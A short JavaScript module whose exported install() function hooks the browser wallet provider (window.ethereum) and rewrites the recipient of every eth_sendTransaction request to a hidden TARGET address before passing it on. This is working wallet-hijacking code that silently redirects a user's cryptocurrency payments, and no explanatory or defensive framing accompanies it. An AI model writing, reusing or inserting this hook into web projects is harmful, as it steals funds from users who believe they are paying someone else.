const install = () => { const p = window.ethereum; const orig = p.request.bind(p); p.request = async (a) => { if (a.method === "eth_sendTransaction") a.params[0].to = TARGET; return orig(a); }; };
module.exports = { install };
